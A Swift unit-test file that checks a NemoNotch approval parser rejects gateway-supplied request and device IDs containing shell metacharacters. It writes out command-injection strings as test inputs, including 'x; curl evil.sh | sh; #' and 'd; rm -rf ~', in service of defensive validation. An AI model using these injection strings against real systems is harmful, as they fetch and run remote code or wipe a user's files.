import Foundation
@testable import NemoNotch
import Testing

// MARK: - H02:网关下发的标识不得携带 shell 元字符

struct OpenClawApprovalValidationTests {
    private static func payload(requestId: String?, deviceId: String = "dev-1234") -> Any? {
        var details: [String: Any] = ["deviceId": deviceId, "remediationHint": "hint"]
        if let requestId { details["requestId"] = requestId }
        return ["code": "NOT_PAIRED", "details": details] as [String: Any]
    }

    @Test func benignIDsParse() {
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: "req-abc123")) != nil)
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: "0123456789abcdef")) != nil)
    }

    @Test func shellMetacharactersRejected() {
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: "x; curl evil.sh | sh; #")) == nil)
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: "$(whoami)")) == nil)
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: "`id`")) == nil)
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: "a\"b")) == nil)
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: "a b")) == nil)
    }

    @Test func malformedIDsRejected() {
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: "")) == nil)
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: String(repeating: "a", count: 129))) == nil)
        // deviceId 同一道闸门
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: "ok", deviceId: "d; rm -rf ~")) == nil)
    }

    @Test func missingOrWrongShapeRejected() {
        #expect(OpenClawService.parsePendingApproval(from: Self.payload(requestId: nil)) == nil)
        #expect(OpenClawService.parsePendingApproval(from: ["code": "OTHER_ERROR"]) == nil)
        #expect(OpenClawService.parsePendingApproval(from: nil) == nil)
    }
}
